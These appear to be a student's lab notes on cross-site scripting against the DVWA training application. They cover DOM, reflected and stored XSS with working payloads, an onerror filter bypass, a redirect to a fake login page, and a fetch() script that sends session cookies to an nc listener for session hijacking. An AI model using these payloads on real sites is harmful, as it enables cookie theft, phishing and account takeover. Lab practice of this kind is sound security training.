Corss-site scripting
Abusing application functionality to create malicious JavaScript

DOM-based : Mutating the html document
Reflected : URL params displayed in the page
Stored : saved dat rendered for all viewers


We start with DOM based:
On our Lab when we change the language we notice the URL is modified and we can change manualy that URL ?default
By analysing the button we see that there is a select element where we can write a string between "". So we close the quotation marks with ' and then close the option tag with a > and close it properly with the closing tag and we do the same with the select tag </option></select>. We can add html elements
'></option></select><script>alert('XSS')</script>
we can redirect traffic to a fake logging page
'></option></select><script>document.location.href="https://site"</script>

For medium difficulty we cannot insert script tag, we try to load an image and will prompt the alert message in the error descriptor
"></option></select><img src=x onerror="alert('XSS')">


REFLECTED 
When security is low we can enter a script as usual
When security is medium we can apply the <img onerror="alert('XSS')" src=x>

STORED
We got a max length limitation for the Name field. We manually change the parameter
When reloading the params are still on

END 
When it's done we are going in Inspect section, we browse to Application > Cookies. Here we have the PHPsessionID controling the login session to dvwa tracking the user session from logging in to logging out
We can try to hijack the cookie to forge identity. We can access it if the HTTP only tag is not checked using Javascript
We can display them in the console using document.cookie
On our host machine we start o listen on port 8000
$nc -nvlp 8000
Then from the XSS stored section in message we are writing a script using the fetch() function to make abitrary web request
<script>fetch('http://192.168.1.48:8000/'+document.cookie);</script>
With the ip address being the ip address of our local host machine being in a listening state over port 8000 => cookie are extracted
From a private web browser windis we browse the DVWA address. We go to the cookie page without login, a new cookie PHPSESSID is created and we are going to change it with our extracted cookie. We remove the login.php from the URL and we are logged in.






